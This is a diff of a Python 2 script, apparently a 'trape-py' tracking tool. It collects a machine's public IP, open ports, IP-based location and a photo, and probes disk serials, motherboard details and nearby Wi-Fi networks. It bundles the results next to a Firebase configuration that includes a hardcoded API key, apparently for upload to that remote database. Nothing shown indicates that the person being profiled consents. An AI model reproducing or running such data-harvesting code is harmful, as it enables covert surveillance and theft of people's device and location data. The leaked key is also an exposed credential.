@@ -8,7 +8,7 @@ import uuid
 import os
 import pyrebase
 import base64
-import subprocess
+
 
 
 def getmiIpPublica():
@@ -52,40 +52,6 @@ def getPuertosOpen():
     connection.close()
     return lista
 
-def getSerialDisk():
-    c = wmi.WMI()
-    for item in c.Win32_PhysicalMedia():
-        s = item.SerialNumber
-        # print str(s)
-        # print item.Tag
-        break;
-    return s
-
-def getSerialUUID():
-    #print uuid.UUID(int=uuid.getnode())
-    s = uuid.uuid1()
-    # print (s)
-    return s
-
-
-def getSerialPlaca():
-    # os.system('wmic baseboard get product,Manufacturer,version,serialnumber')
-    # SP = (p,m,v,s)
-    SP = {
-        'product':os.popen('wmic baseboard get product').read(),
-        'Manufacturer':os.popen('wmic baseboard get Manufacturer').read(),
-        'version':os.popen('wmic baseboard get version').read(),
-        'serialnumber':os.popen('wmic baseboard get serialnumber').read()
-    }
-    return SP
-
-def getInterfacesRed():
-    ARed = []
-    Red = os.popen('netsh wlan show networks mode=bssid').read()
-    # print (Red)
-    ARed.append(Red)
-    return Red
-
 # def getUbicacion():
 #     datos={
 #         "considerIp":"true"
@@ -94,6 +60,27 @@ def getInterfacesRed():
 #     response = requests.post(url,json=datos)
 #     data = response.json()
 #     print(str(data))
+
+def getSerialDisk():
+    c = wmi.WMI()
+    for item in c.Win32_PhysicalMedia():
+        s = item.SerialNumber
+        print str(s)
+        # print item.Tag
+        break;
+
+def getSerialUUID():
+    #print uuid.UUID(int=uuid.getnode())
+    print uuid.uuid1()
+
+def getSerialPlaca():
+    print os.system('wmic baseboard get product,Manufacturer,version,serialnumber')
+
+def getInterfacesRed():
+    ARed = []
+    Red = os.system('netsh wlan show networks mode=bssid')
+    print (Red)
+    ARed.append(Red)
 
 def getUbicacionIP():
     pagina = urllib.urlopen('https://es.geoipview.com/').read()
@@ -172,42 +159,33 @@ if str(platform_data[0]) == "Windows":
     print ('')
     print ('-------Foto------')
     f = getFoto()
-    msjF = ('Datos Foto')
-    DFoto = (str(msjF), f)
+    msjF = "Datos Foto",
+    DFoto = (msjF, f)
     # print (DFoto)
     print ('')
     print ('')
-    print ('-------N serial Disco------')
-    s = getSerialDisk()
-    msjS = ('Datos Disk')
-    DNSDisk = (str(msjS),str(s))
+    # print ('-------N serial Disco------')
+    # DNSDisk = getSerialDisk()
     # print (DNSDisk)
-    print ('')
-    print ('')
-    print ('-------N serial UUID------')
-    U = getSerialUUID()
-    msjU = ('Datos UUID')
-    DNSUUID = (str(msjU),str(U))
+    # print ('')
+    # print ('')
+    # print ('-------N serial UUID------')
+    # DNSUUID = str(getSerialUUID())
     # print (DNSUUID)
-    print ('')
-    print ('')
-    print ('-------Imformacion de la placa base------')
-    PB = getSerialPlaca()
-    msjPB = ('Datos placa base')
-    DInfoplaca = (str(msjPB), str(PB))
+    # print ('')
+    # print ('')
+    # print ('-------Imformacion de la placa base------')
+    # DInfoplaca = str(getSerialPlaca())
     # print (DInfoplaca)
-    print ('')
-    print ('')
-    print ('-------Imformacion de las Interfaces de Red------')
-    IR = getInterfacesRed()
-    msjIR = ('Datos Interfaces de Red')
-    DInfored = (str(msjIR), IR)
+    # print ('')
+    # print ('')
+    # print ('-------Imformacion de las Interfaces de Red------')
+    # DInfored = str(getInterfacesRed())
     # print (DInfored)
 else:
     print ('linux')
-
-
-DUniversal = ({'DSistema':DSistema,'DRed':DRed,'DDisk':DDisk,'DPuertos':DPuertos,'DUbicacion':DUbicacion,'DFoto':DFoto, 'DNSDisk':DNSDisk, 'DNSUUID':DNSUUID, 'DInfoplaca':DInfoplaca, 'DInfored':DInfored})
+# DUniversal = (DSistema + DRed + DDisk + DPuertos + DUbicacion + DFoto + DNSDisk + DNSUUID + DInfoplaca + DInfored)
+DUniversal = ({'DSistema':DSistema,'DRed':DRed,'DDisk':DDisk,'DPuertos':DPuertos,'DUbicacion':DUbicacion,'DFoto':DFoto})
 config = {
     "apiKey": "AIzaSyDNyT41R1AXYpp6k7xP3m4S_EIUGibcj8s",
     "authDomain": "trape-py-1554172486593.firebaseapp.com",
